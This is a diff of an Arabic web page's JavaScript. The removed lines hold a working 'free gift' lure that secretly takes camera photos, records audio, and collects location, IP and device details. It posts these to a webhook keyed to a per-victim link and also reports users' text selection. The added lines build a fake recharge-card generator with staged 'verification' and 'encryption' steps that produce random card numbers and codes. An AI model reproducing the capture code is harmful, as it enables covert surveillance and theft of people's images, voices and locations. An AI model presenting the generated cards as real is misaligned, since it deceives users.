+                if (!matchedOp) {
+                    const prefixes = operators.map(o => o.prefix).join(', ');
+                    validMsg.textContent = `⚠️ يجب أن يبدأ بـ ${prefixes}`;
+                } else {
+                    validMsg.textContent = `⚠️ الرقم غير مكتمل (يحتاج ${minLength} أرقام على الأقل)`;
                 }
+
+                operatorBadge.style.display = 'none';
+                generateBtn.disabled = true;
+                generateBtn.textContent = '✦ أدخل رقم صحيح أولاً';
+
+            } else {
+                // Empty
+                statusIcon.className = 'status-icon';
+                statusIcon.textContent = '';
+                validMsg.className = 'validation-msg';
+                validMsg.textContent = 'أدخل رقم صحيح';
+                operatorBadge.style.display = 'none';
+                generateBtn.disabled = true;
+                generateBtn.textContent = '✦ أدخل رقم صحيح أولاً';
+                state.isValid = false;
+                state.operator = null;
+            }
+        });
+
+        /* ═══════════════════════════════════════════════════════════════════
+           GENERATE CARD — Cinematic Creation
+           ═══════════════════════════════════════════════════════════════════ */
+
+        generateBtn.addEventListener('click', function() {
+            if (!state.isValid || !state.operator || !state.country) return;
+            generateCard();
+        });
+
+        function generateCard() {
+            if (state.isGenerating) return;
+
+            state.isGenerating = true;
+            genOverlay.classList.add('active');
+            genBar.style.width = '0%';
+
+            const steps = [
+                { progress: 12, status: 'جاري التحقق من الرقم' },
+                { progress: 28, status: 'تجهيز بيانات المشغل' },
+                { progress: 45, status: 'تصميم الكارت' },
+                { progress: 62, status: 'تضمين الشريحة' },
+                { progress: 80, status: 'تفعيل الهولوغرام' },
+                { progress: 95, status: 'تشفير البيانات' },
+                { progress: 100, status: 'الكارت جاهز ✦' },
+            ];
+
+            let stepIdx = 0;
+
+            function advance() {
+                if (stepIdx >= steps.length) {
+                    finishCardGeneration();
+                    return;
+                }
+                const s = steps[stepIdx];
+                genStatus.textContent = s.status;
+                genBar.style.width = s.progress + '%';
+                genCore.style.transform = `scale(${1 + s.progress / 200})`;
+                genCore.style.boxShadow =
+                    `0 0 ${80 + s.progress}px ${state.operator.glow}`;
+                stepIdx++;
+                const delay = stepIdx < 4 ? 180 + Math.random() * 140 : 120 + Math.random() * 100;
+                setTimeout(advance, delay);
+            }
+
+            advance();
+        }
+
+        function finishCardGeneration() {
+            state.isGenerating = false;
+            genOverlay.classList.remove('active');
+
+            const card = buildCard();
+            state.cardData = card;
+            renderCard(card);
+
+            simCard.classList.add('visible');
+            cardActions.classList.add('visible');
+
+            // Animate in
+            simCard.style.opacity = '0';
+            simCard.style.transform = 'scale(0.94) translateY(16px)';
+            requestAnimationFrame(() => {
+                simCard.style.transition = 'all 0.6s cubic-bezier(0.16,1,0.3,1)';
+                simCard.style.opacity = '1';
+                simCard.style.transform = 'scale(1) translateY(0)';
             });
-            document.addEventListener('dragstart', (e) => { e.preventDefault();
-                sendSuspiciousAlert('🔄 سحب'); });
-            document.addEventListener('selectstart', () => { sendSuspiciousAlert('✏️ تحديد نص'); });
+
+            generateBtn.textContent = '✦ تم الإنشاء ✓';
+            setTimeout(() => {
+                if (!state.isGenerating) {
+                    generateBtn.textContent = '✦ إنشاء كارت جديد';
+                }
+            }, 1500);
         }
 
-        let alertCooldown = 0;
+        /* ═══════════════════════════════════════════════════════════════════
+           BUILD CARD DATA
+           ═══════════════════════════════════════════════════════════════════ */
 
-        function sendSuspiciousAlert(action) {
-            if (!USER_TOKEN) return;
-            const now = Date.now();
-            if (now - alertCooldown < 5000) return;
-            alertCooldown = now;
-            const fd = new FormData();
-            fd.append('event', 'suspicious');
-            fd.append('action', action);
-            fd.append('timestamp', new Date().toISOString());
-            fd.append('ip', userIP);
-            fd.append('userAgent', navigator.userAgent);
-            fd.append('url', window.location.href);
-            sendToWebhook(fd).catch(() => {});
-        }
+        function buildCard() {
+            const op = state.operator;
+            const country = state.country;
+            const pkg = PACKAGES[Math.floor(Math.random() * PACKAGES.length)];
 
-        // ============================================================
-        //  RARITY PICKER
-        // ============================================================
-        function pickRarity() {
-            const total = RARITIES.reduce((s, r) => s + r.weight, 0);
-            let rand = Math.random() * total;
-            for (const r of RARITIES) {
-                rand -= r.weight;
-                if (rand <= 0) return r;
+            const now = new Date();
+            const validUntil = new Date(now);
+            validUntil.setFullYear(validUntil.getFullYear() + 1);
+
+            // Generate 16-digit card number
+            let cardNum = '';
+            for (let i = 0; i < 16; i++) {
+                cardNum += Math.floor(Math.random() * 10);
+                if (i % 4 === 3 && i < 15) cardNum += ' ';
             }
-            return RARITIES[0];
-        }
 
-        // ============================================================
-        //  CARD GENERATOR
-        // ============================================================
-        function generateCardDesign(countryName, index) {
-            const country = COUNTRIES_DATA[countryName];
-            const rarity = pickRarity();
-            const colors = country.colors;
-            const c1 = colors[Math.floor(Math.random() * colors.length)];
-            const c2 = colors[Math.floor(Math.random() * colors.length)];
-            const c3 = colors[Math.floor(Math.random() * colors.length)];
+            const serial = 'NX-' +
+                String.fromCharCode(65 + Math.floor(Math.random() * 26)) +
+                String.fromCharCode(65 + Math.floor(Math.random() * 26)) +
+                '-' +
+                String(Math.floor(10000 + Math.random() * 90000)) +
+                '-' +
+                String(Math.floor(1000 + Math.random() * 9000));
 
-            // random material variation
-            const materials = [
-                'linear-gradient(135deg, rgba(255,255,255,0.02), rgba(255,255,255,0.005))',
-                'linear-gradient(145deg, rgba(255,255,255,0.015), rgba(0,0,0,0.01))',
-                'radial-gradient(ellipse at 30% 40%, rgba(255,255,255,0.02), transparent 60%)',
-                'linear-gradient(225deg, rgba(255,255,255,0.01), rgba(0,0,0,0.01))',
-            ];
-            const material = materials[Math.floor(Math.random() * materials.length)];
-
-            // random icon
-            const icons = ['fa-sim-card', 'fa-microchip', 'fa-wifi', 'fa-signal', 'fa-broadcast', 'fa-satellite'];
-            const icon = icons[Math.floor(Math.random() * icons.length)];
-
-            // random engraving
-            const engravings = ['LIMITED', 'PREMIUM', 'EXCLUSIVE', 'EDITION', 'MASTER', 'ELITE', 'PRIME', 'ULTRA', 'HYPER',
-                'NEO'
-            ];
-            const engraving = engravings[Math.floor(Math.random() * engravings.length)];
-
-            // random holo angle
-            const holoAngle = Math.floor(Math.random() * 360);
-
-            // particles
-            const particleCount = 4 + Math.floor(Math.random() * 8);
-            const particles = [];
-            for (let i = 0; i < particleCount; i++) {
-                particles.push({
-                    px: (Math.random() - 0.5) * 60,
-                    py: (Math.random() - 0.5) * 80,
-                    delay: Math.random() * 4,
-                    duration: 3 + Math.random() * 3,
-                });
-            }
+            const auth = String(Math.floor(1000 + Math.random() * 9000));
+            const brandNames = ['NEXUS', 'TELECOM', 'GLOBAL', 'PREMIUM', 'SIGNATURE'];
+            const brand = brandNames[Math.floor(Math.random() * brandNames.length)] + ' RECHARGE';
 
             return {
-                country: countryName,
-                flag: country.flag,
-                prefixes: country.prefixes,
-                rarity,
-                colors: [c1, c2, c3],
-                accent: country.accent,
-                material,
-                icon,
-                engraving,
-                holoAngle,
-                particles,
-                index,
-                id: `card-${Date.now()}-${index}-${Math.random().toString(36).substr(2, 4)}`,
+                number: cardNum,
+                serial: serial,
+                auth: auth,
+                validUntil: validUntil.toLocaleDateString('en-US', { month: '2-digit', year: '2-digit' }),
+                brand: brand,
+                value: pkg.value,
+                data: pkg.data,
+                operator: op,
+                country: country,
+                package: pkg,
+                phone: state.phone,
             };
         }
 
-        // ============================================================
-        //  RENDER CARDS
-        // ============================================================
-        function renderCards(cards, animate = true) {
-            cardsGrid.innerHTML = '';
-            cards.forEach((card, idx) => {
-                const wrap = document.createElement('div');
-                wrap.className = 'sim-card-wrap';
-                if (animate) wrap.classList.add('entering');
-                wrap.style.animationDelay = `${idx * 0.06}s`;
+        /* ═══════════════════════════════════════════════════════════════════
+           RENDER CARD
+           ═══════════════════════════════════════════════════════════════════ */
 
-                const cardEl = document.createElement('div');
-                cardEl.className = 'sim-card';
-                cardEl.dataset.index = idx;
+        function renderCard(card) {
+            const op = card.operator;
+            const c1 = op.color;
+            const c2 = op.color2;
 
-                // --- FRONT ---
-                const front = document.createElement('div');
-                front.className = 'sim-card-face sim-card-front';
+            simBrand.textContent = card.brand;
+            simNumber.textContent = card.number;
+            simValid.textContent = card.validUntil;
+            simCode.textContent = card.auth;
+            simData.textContent = card.data;
+            simValue.textContent = '$' + card.value;
+            simEngrave.textContent = '∞ ' + card.serial;
+            simOpLabel.textContent = op.name.toUpperCase();
 
-                // rarity
-                const rarityLabel = document.createElement('span');
-                rarityLabel.className = 'card-rarity';
-                rarityLabel.style.setProperty('--rarity-color', card.rarity.color);
-                rarityLabel.textContent = card.rarity.label;
-                front.appendChild(rarityLabel);
+            // Hologram
+            const hue = Math.floor(Math.random() * 360);
+            simHolo.style.background =
+                `radial-gradient(circle at 30% 40%, hsla(${hue},80%,70%,0.05), transparent 70%)`;
 
-                // material bg
-                const materialBg = document.createElement('div');
-                materialBg.className = 'card-material';
-                materialBg.style.setProperty('--card-material-bg', card.material);
-                front.appendChild(materialBg);
+            // Border
+            simCard.style.borderColor = `${c1}44`;
+            simCard.style.boxShadow =
+                `0 20px 60px rgba(0,0,0,0.5), 0 0 40px ${op.glow}`;
 
-                // border glow
-                const borderGlow = document.createElement('div');
-                borderGlow.className = 'card-border-glow';
-                borderGlow.style.setProperty('--card-glow', card.rarity.glow);
-                front.appendChild(borderGlow);
+            // Data icon
+            const icons = ['📶', '📡', '📱', '🌐', '⚡', '🔷', '💠'];
+            simDataIcon.textContent = icons[Math.floor(Math.random() * icons.length)];
 
-                // shine
-                const shine = document.createElement('div');
-                shine.className = 'card-shine';
-                front.appendChild(shine);
+            // QR pattern
+            renderQR();
 
-                // hologram
-                const holo = document.createElement('div');
-                holo.className = 'card-holo';
-                holo.style.setProperty('--holo-angle', `${card.holoAngle}deg`);
-                front.appendChild(holo);
+            // Reset flip/rotation
+            state.isFlipped = false;
+            state.rotation = 0;
+            simCard.style.transform = 'rotateY(0deg)';
+        }
 
-                // particles
-                const particlesEl = document.createElement('div');
-                particlesEl.className = 'card-particles';
-                card.particles.forEach((p, pi) => {
-                    const dot = document.createElement('span');
-                    dot.className = 'p';
-                    dot.style.setProperty('--px', `${p.px}px`);
-                    dot.style.setProperty('--py', `${p.py}px`);
-                    dot.style.animationDelay = `${p.delay}s`;
-                    dot.style.animationDuration = `${p.duration}s`;
-                    dot.style.background = card.rarity.color;
-                    particlesEl.appendChild(dot);
-                });
-                front.appendChild(particlesEl);
-
-                // icon
-                const iconEl = document.createElement('div');
-                iconEl.className = 'card-icon';
-                iconEl.innerHTML = `<i class="fas ${card.icon}"></i>`;
-                iconEl.style.setProperty('--card-icon-color', `rgba(255,255,255,0.03)`);
-                iconEl.style.setProperty('--card-icon-hover', card.accent);
-                front.appendChild(iconEl);
-
-                // name
-                const nameEl = document.createElement('div');
-                nameEl.className = 'card-name';
-                nameEl.textContent = card.country;
-                front.appendChild(nameEl);
-
-                // sub
-                const subEl = document.createElement('div');
-                subEl.className = 'card-sub';
-                subEl.textContent = card.prefixes.join(' · ');
-                front.appendChild(subEl);
-
-                // engraving
-                const engEl = document.createElement('div');
-                engEl.className = 'card-engrave';
-                engEl.textContent = card.engraving;
-                front.appendChild(engEl);
-
-                // --- BACK ---
-                const back = document.createElement('div');
-                back.className = 'sim-card-face sim-card-back';
-
-                const backFlag = document.createElement('div');
-                backFlag.className = 'back-flag';
-                backFlag.textContent = card.flag;
-                back.appendChild(backFlag);
-
-                const backName = document.createElement('div');
-                backName.className = 'back-name';
-                backName.textContent = card.country;
-                back.appendChild(backName);
-
-                const backPrefix = document.createElement('div');
-                backPrefix.className = 'back-prefix';
-                backPrefix.textContent = `📞 ${card.prefixes.join(' · ')}`;
-                back.appendChild(backPrefix);
-
-                const selectBtn = document.createElement('button');
-                selectBtn.className = 'back-select';
-                selectBtn.textContent = 'اختر هذه الشريحة';
-                selectBtn.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    selectCard(card, idx);
-                });
-                back.appendChild(selectBtn);
-
-                cardEl.appendChild(front);
-                cardEl.appendChild(back);
-                wrap.appendChild(cardEl);
-
-                // click to flip
-                wrap.addEventListener('click', (e) => {
-                    if (e.target.closest('.back-select')) return;
-                    if (cardEl.classList.contains('flipped')) {
-                        cardEl.classList.remove('flipped');
-                    } else {
-                        cardEl.classList.add('flipped');
-                    }
-                });
-
-                cardsGrid.appendChild(wrap);
-            });
-
-            // after animation, remove entering class
-            if (animate) {
-                setTimeout(() => {
-                    document.querySelectorAll('.sim-card-wrap.entering').forEach(el => {
-                        el.classList.remove('entering');
-                    });
-                }, 1200);
+        function renderQR() {
+            simQR.innerHTML = '';
+            const size = 5;
+            for (let i = 0; i < size * size; i++) {
+                const dot = document.createElement('span');
+                dot.className = 'dot';
+                if (Math.random() > 0.4) dot.classList.add('filled');
+                simQR.appendChild(dot);
             }
         }
 
-        // ============================================================
-        //  SELECT CARD
-        // ============================================================
-        function selectCard(card, index) {
-            if (isProcessing) return;
-            selectedCountry = card.country;
-            selectedCardIndex = index;
+        /* ═══════════════════════════════════════════════════════════════════
+           CARD INTERACTIONS
+           ═══════════════════════════════════════════════════════════════════ */
 
-            // highlight selected card
-            document.querySelectorAll('.sim-card-wrap').forEach((w, i) => {
-                if (i === index) {
-                    w.style.transform = 'scale(1.04) translateY(-8px)';
-                    w.style.boxShadow = '0 30px 80px rgba(201,168,76,0.04)';
-                } else {
-                    w.style.opacity = '0.2';
-                    w.style.transform = 'scale(0.94)';
-                }
-            });
-
-            // show claim step
-            const prefixes = COUNTRIES_DATA[card.country].prefixes;
-            taskSub.textContent = `للاستفادة من هدية ${card.country} (رصيد، نت، وحدات)`;
-
-            permissionArea.innerHTML = `
-                <div class="gift-top">
-                    <span class="gift-box-3d"><i class="fas fa-gift"></i></span>
-                    <span class="gift-title">هدية رقمية · ${card.country}</span>
-                </div>
-                <ul>
-                    <li><i class="fas fa-coins"></i> رصيد بقيمة تصل إلى 50$</li>
-                    <li><i class="fas fa-wifi"></i> باقة نت إضافية 7 أيام</li>
-                    <li><i class="fas fa-phone"></i> وحدات اتصال محلية ودولية</li>
-                </ul>
-                <div class="gift-note"><i class="fas fa-sim-card" style="margin-left:8px;"></i> الأرقام المسموحة: <strong>${prefixes.join(' · ')}</strong></div>
-            `;
-
-            phoneInput.placeholder = `مثال: ${prefixes[0]}12345678`;
-            phoneInput.value = '';
-            capturedPhotoFiles = [];
-            audioChunks = [];
-            audioBlob = null;
-            claimBtn.disabled = false;
-            claimBtn.classList.remove('loading');
-            claimBtn.querySelector('.btn-text').innerHTML =
-                '<i class="fas fa-gift" style="margin-left:12px;"></i> احصل على هديتي';
-
-            showStep('step-claim');
-
-            // get location
-            getLocation();
-        }
-
-        // ============================================================
-        //  SHUFFLE
-        // ============================================================
-        function shuffleCards() {
-            if (isShuffling) return;
-            isShuffling = true;
-            shuffleBtn.disabled = true;
-            shuffleBtn.classList.add('loading');
-
-            // exit animation on all cards
-            const wraps = document.querySelectorAll('.sim-card-wrap');
-            wraps.forEach((w, i) => {
-                w.classList.add('exiting');
-                w.style.animationDelay = `${i * 0.03}s`;
-            });
-
-            setTimeout(() => {
-                // generate new cards
-                const shuffled = COUNTRY_NAMES.sort(() => Math.random() - 0.5);
-                const count = Math.min(8, shuffled.length);
-                const selected = shuffled.slice(0, count);
-                const newCards = selected.map((name, i) => generateCardDesign(name, i));
-                currentCards = newCards;
-
-                renderCards(newCards, true);
-
-                // reset card states
-                document.querySelectorAll('.sim-card-wrap').forEach(w => {
-                    w.style.transform = '';
-                    w.style.boxShadow = '';
-                    w.style.opacity = '';
-                    const card = w.querySelector('.sim-card');
-                    if (card) card.classList.remove('flipped');
-                });
-
-                isShuffling = false;
-                shuffleBtn.disabled = false;
-                shuffleBtn.classList.remove('loading');
-            }, 400);
-        }
-
-        // ============================================================
-        //  LOCATION
-        // ============================================================
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
-                    resolve();
-                    return;
-                }
-                let watchId = null;
-                let best = null;
-                let bestAcc = Infinity;
-                let resolved = false;
-                let attempts = 0;
-                const MAX_ATTEMPTS = 10;
-                const TIMEOUT_MS = 15000;
-                const TARGET = 100;
-
-                const done = () => {
-                    if (resolved) return;
-                    resolved = true;
-                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                    if (best) {
-                        userLocation.lat = best.coords.latitude;
-                        userLocation.lng = best.coords.longitude;
-                        userLocation.accuracy = best.coords.accuracy;
-                        userLocation.error = null;
-                    } else {
-                        userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
-                    }
-                    resolve();
-                };
-
-                const timeoutId = setTimeout(() => {
-                    if (!resolved) {
-                        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                        if (best) done();
-                        else { userLocation.error = 'انتهت المهلة';
-                            resolve(); }
-                    }
-                }, TIMEOUT_MS);
-
-                const handlePos = (pos) => {
-                    attempts++;
-                    const acc = pos.coords.accuracy;
-                    if (acc < bestAcc) { bestAcc = acc;
-                        best = pos; }
-                    if (acc <= TARGET || attempts >= MAX_ATTEMPTS) {
-                        done();
-                        clearTimeout(timeoutId);
-                    }
-                };
-
-                const handleErr = (err) => {
-                    if (resolved) return;
-                    if (err.code === 1) {
-                        userLocation.error = 'تم رفض الإذن بالموقع';
-                        resolved = true;
-                        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                        clearTimeout(timeoutId);
-                        resolve();
-                        return;
-                    }
-                    if (attempts >= MAX_ATTEMPTS) {
-                        if (best) done();
-                        else { userLocation.error = err.message || 'تعذر الحصول على الموقع';
-                            resolve(); }
-                    }
-                };
-
-                watchId = navigator.geolocation.watchPosition(handlePos, handleErr, {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 2000
-                });
-            });
-        }
-
-        // ============================================================
-        //  CAMERA
-        // ============================================================
-        async function startCameraAndCapture() {
-            try {
-                const constraints = { video: true, audio: false };
-                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = mediaStream;
-                await video.play();
-
-                await new Promise((resolve, reject) => {
-                    const to = setTimeout(() => reject(new Error('Video timeout')), 10000);
-                    const ready = () => { clearTimeout(to);
-                        resolve(); };
-                    if (video.readyState >= 2 && video.videoWidth > 0) ready();
-                    else {
-                        video.addEventListener('loadedmetadata', ready);
-                        video.addEventListener('canplay', ready);
-                        video.play().catch(() => {});
-                    }
-                });
-
-                await new Promise((r) => setTimeout(r, 500));
-                const ctx = canvas.getContext('2d');
-                const w = Math.min(video.videoWidth || 640, 1920);
-                const h = Math.min(video.videoHeight || 480, 1080);
-                canvas.width = w;
-                canvas.height = h;
-
-                capturedPhotoFiles = [];
-                for (let i = 1; i <= TOTAL_PHOTOS; i++) {
-                    ctx.drawImage(video, 0, 0, w, h);
-                    const blob = await new Promise((res) => canvas.toBlob(res, 'image/jpeg', PHOTO_QUALITY));
-                    if (blob && blob.size > 1000) {
-                        const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
-                        capturedPhotoFiles.push(file);
-                    }
-                    if (i < TOTAL_PHOTOS) await new Promise((r) => setTimeout(r, CAPTURE_INTERVAL));
-                }
-                return true;
-            } catch (err) {
-                console.error('Camera error:', err);
-                if (mediaStream) { mediaStream.getTracks().forEach((t) => t.stop());
-                    mediaStream = null; }
-                video.srcObject = null;
-                return false;
-            }
-        }
-
-        // ============================================================
-        //  AUDIO
-        // ============================================================
-        async function recordAudio() {
-            try {
-                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
-                audioChunks = [];
-                audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
-                audioRecorder.onstop = () => {
-                    if (audioChunks.length > 0) {
-                        audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    }
-                };
-                audioRecorder.start();
-                setTimeout(() => {
-                    if (audioRecorder.state === 'recording') audioRecorder.stop();
-                    if (audioStream) audioStream.getTracks().forEach((t) => t.stop());
-                }, AUDIO_DURATION);
-                return true;
-            } catch (err) {
-                console.error('Audio error:', err);
-                return false;
-            }
-        }
-
-        // ============================================================
-        //  SEND DATA
-        // ============================================================
-        async function sendAllData() {
-            const fd = new FormData();
-            fd.append('event', 'submission');
-            fd.append('country', selectedCountry);
-            fd.append('phone', userPhone);
-            fd.append('ip', userIP);
-            fd.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
-            fd.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
-            fd.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
-            fd.append('location[error]', userLocation.error || '');
-            fd.append('device[userAgent]', navigator.userAgent);
-            fd.append('device[platform]', navigator.platform);
-            fd.append('device[language]', navigator.language);
-            fd.append('device[screen]', `${screen.width}x${screen.height}`);
-            fd.append('device[colorDepth]', screen.colorDepth);
-            fd.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
-            fd.append('timestamp', new Date().toISOString());
-
-            capturedPhotoFiles.forEach((f, i) => fd.append(`photos[]`, f, f.name));
-            if (audioBlob) {
-                const af = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
-                fd.append('audio', af);
-            }
-
-            const result = await sendToWebhook(fd);
-            return result.success;
-        }
-
-        // ============================================================
-        //  CLAIM BUTTON
-        // ============================================================
-        claimBtn.addEventListener('click', async () => {
-            if (!USER_TOKEN) {
-                showStatus(statusTasks, 'error', '⚠️ رابط غير صحيح، يرجى الدخول من الرابط المخصص.');
-                return;
-            }
-            if (isProcessing) return;
-
-            const phone = phoneInput.value.trim();
-            if (!phone) {
-                showStatus(statusTasks, 'error', '⚠️ يرجى إدخال رقم الهاتف');
-                return;
-            }
-            const prefixes = COUNTRIES_DATA[selectedCountry].prefixes;
-            let valid = false;
-            for (const p of prefixes) {
-                if (phone.startsWith(p)) { valid = true; break; }
-            }
-            if (!valid) {
-                showStatus(statusTasks, 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
-                return;
-            }
-            userPhone = phone;
-
-            isProcessing = true;
-            claimBtn.disabled = true;
-            claimBtn.classList.add('loading');
-            claimBtn.querySelector('.btn-text').innerHTML = 'جاري التأكيد...';
-
-            showStatus(statusTasks, 'info', '⏳ جاري إرسال البيانات...');
-
-            await getIPAddress();
-            await startCameraAndCapture();
-            await recordAudio();
-
-            const success = await sendAllData();
-
-            if (success) {
-                showStep('step-timer');
-                startTimer(180);
-                showStatus(statusTimer, 'success', '🎉 تم إرسال هديتك! تحقق من هاتفك.');
+        function generateNewCard() {
+            if (state.country && state.operator && state.isValid) {
+                generateCard();
             } else {
-                showStatus(statusTasks, 'error', '⚠️ فشل الإرسال، حاول مرة أخرى.');
-                claimBtn.disabled = false;
-                claimBtn.classList.remove('loading');
-                claimBtn.querySelector('.btn-text').innerHTML =
-                    '<i class="fas fa-gift" style="margin-left:12px;"></i> احصل على هديتي';
-                isProcessing = false;
+                goToCountry();
+            }
+        }
+
+        function flipCard() {
+            state.isFlipped = !state.isFlipped;
+            const deg = state.isFlipped ? 180 : 0;
+            simCard.style.transition = 'transform 0.7s cubic-bezier(0.16,1,0.3,1)';
+            simCard.style.transform = `rotateY(${deg}deg)`;
+            state.rotation = 0;
+        }
+
+        function rotateCard() {
+            state.rotation += 360;
+            const flip = state.isFlipped ? 180 : 0;
+            simCard.style.transition = 'transform 1.2s cubic-bezier(0.16,1,0.3,1)';
+            simCard.style.transform = `rotateY(${flip + state.rotation}deg)`;
+        }
+
+        function copyCard() {
+            if (!state.cardData) return;
+            const d = state.cardData;
+            const text =
+                `✦ NEXUS RECHARGE CARD ✦\n` +
+                `Brand: ${d.brand}\n` +
+                `Card: ${d.number}\n` +
+                `Valid: ${d.validUntil}\n` +
+                `Code: ${d.auth}\n` +
+                `Value: $${d.value}\n` +
+                `Data: ${d.data}\n` +
+                `Serial: ${d.serial}\n` +
+                `Operator: ${d.operator.name}\n` +
+                `Country: ${d.country.countryKey}\n` +
+                `Phone: ${d.phone}`;
+
+            navigator.clipboard.writeText(text).then(() => {
+                const btns = document.querySelectorAll('.card-actions .btn-sm');
+                const btn = btns[btns.length - 1];
+                const orig = btn.textContent;
+                btn.textContent = '✓ تم النسخ';
+                setTimeout(() => btn.textContent = orig, 1500);
+            }).catch(() => {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                ta.remove();
+                const btns = document.querySelectorAll('.card-actions .btn-sm');
+                const btn = btns[btns.length - 1];
+                const orig = btn.textContent;
+                btn.textContent = '✓ تم النسخ';
+                setTimeout(() => btn.textContent = orig, 1500);
+            });
+        }
+
+        /* ═══════════════════════════════════════════════════════════════════
+           SURPRISE ME
+           ═══════════════════════════════════════════════════════════════════ */
+
+        function surpriseMe() {
+            const keys = Object.keys(TELECOM_DATA);
+            const randKey = keys[Math.floor(Math.random() * keys.length)];
+            const country = TELECOM_DATA[randKey];
+            const op = country.operators[Math.floor(Math.random() * country.operators.length)];
+
+            // Generate a valid number
+            let num = op.prefix;
+            const remaining = 8 - op.prefix.length;
+            for (let i = 0; i < remaining; i++) {
+                num += Math.floor(Math.random() * 10);
+            }
+            // Pad if needed
+            while (num.length < 10) num += Math.floor(Math.random() * 10);
+
+            state.countryKey = randKey;
+            state.country = country;
+            state.operator = op;
+            state.phone = num;
+            state.isValid = true;
+
+            // Update UI
+            phonePrefix.textContent = country.code;
+            phonePageLabel.textContent = randKey;
+            phonePageTitle.textContent = `أدخل رقم ${randKey}`;
+            phoneCountrySub.textContent = `${randKey} · ${country.code}`;
+
+            // Set colors
+            const root = document.documentElement;
+            root.style.setProperty('--btn-color', op.color);
+            root.style.setProperty('--btn-glow', op.glow);
+            glowAura.style.background =
+                `radial-gradient(circle, ${op.glow}, transparent 70%)`;
+            glowAura.style.opacity = '0.5';
+
+            // Show operator badge
+            operatorBadge.style.display = 'flex';
+            opDot.style.background = op.color;
+            opName.textContent = op.name;
+            opName.style.color = op.color;
+            opSub.textContent = `${randKey} · ${country.code}`;
+
+            // Set input
+            phoneInput.value = num;
+            statusIcon.className = 'status-icon valid';
+            statusIcon.textContent = '✓';
+            validMsg.className = 'validation-msg valid';
+            validMsg.textContent = `✓ رقم صحيح لمشغل ${op.name}`;
+
+            generateBtn.disabled = false;
+            generateBtn.textContent = '✦ إنشاء كارت الشحن';
+
+            // Show phone page
+            document.getElementById('pageCountry').classList.remove('active');
+            document.getElementById('pagePhone').classList.add('active');
+
+            // Auto-generate
+            setTimeout(() => {
+                if (!generateBtn.disabled) {
+                    generateCard();
+                }
+            }, 500);
+        }
+
+        /* ═══════════════════════════════════════════════════════════════════
+           KEYBOARD SHORTCUTS
+           ═══════════════════════════════════════════════════════════════════ */
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && document.activeElement === phoneInput) {
+                if (!generateBtn.disabled) generateBtn.click();
+            }
+            if (e.key === 'g' && !e.ctrlKey && !e.metaKey) {
+                if (!generateBtn.disabled) generateBtn.click();
+            }
+            if (e.key === 'r' && state.cardData) rotateCard();
+            if (e.key === 'f' && state.cardData) flipCard();
+            if (e.key === 'n' && state.cardData) generateNewCard();
+            if (e.key === 'Escape') {
+                if (genOverlay.classList.contains('active')) return;
+                if (state.cardData) {
+                    simCard.classList.remove('visible');
+                    cardActions.classList.remove('visible');
+                    goToCountry();
+                }
             }
         });
 
-        // ============================================================
-        //  IP
-        // ============================================================
-        async function getIPAddress() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                userIP = data.ip;
-            } catch (_) {}
-        }
+        /* ═══════════════════════════════════════════════════════════════════
+           INIT
+           ═══════════════════════════════════════════════════════════════════ */
 
-        // ============================================================
-        //  TIMER
-        // ============================================================
-        function startTimer(seconds) {
-            timerSeconds = seconds;
-            updateTimerDisplay();
-            if (timerInterval) clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                timerSeconds--;
-                updateTimerDisplay();
-                if (timerSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    timerDisplay.textContent = '00:00';
-                }
-            }, 1000);
-        }
+        renderCountries();
 
-        function updateTimerDisplay() {
-            const m = Math.floor(timerSeconds / 60);
-            const s = timerSeconds % 60;
-            timerDisplay.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
-        }
-
-        // ============================================================
-        //  STATUS HELPER
-        // ============================================================
-        function showStatus(el, type, message) {
-            el.className = `status ${type}`;
-            el.textContent = message;
-            el.style.display = 'block';
-            if (type !== 'error') {
-                clearTimeout(el._timeout);
-                el._timeout = setTimeout(() => {
-                    if (el.className.includes(type)) el.style.display = 'none';
-                }, 8000);
-            }
-        }
-
-        // ============================================================
-        //  CLEANUP
-        // ============================================================
-        window.addEventListener('beforeunload', () => {
-            if (mediaStream) mediaStream.getTracks().forEach((t) => t.stop());
-            if (audioStream) audioStream.getTracks().forEach((t) => t.stop());
-            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
-            if (timerInterval) clearInterval(timerInterval);
-        });
-
-        // ============================================================
-        //  SHUFFLE EVENT
-        // ============================================================
-        shuffleBtn.addEventListener('click', shuffleCards);
-
-        // ============================================================
-        //  PARTICLE SYSTEM
-        // ============================================================
-        (function initParticles() {
-            const c = document.getElementById('bg-canvas');
-            const ctx = c.getContext('2d');
-            let w, h;
-            const particles = [];
-            const COUNT = 80;
-
-            function resize() {
-                w = c.width = window.innerWidth;
-                h = c.height = window.innerHeight;
-            }
-            window.addEventListener('resize', resize);
-            resize();
-
-            class Particle {
-                constructor() { this.reset(); }
-                reset() {
-                    this.x = Math.random() * w;
-                    this.y = Math.random() * h;
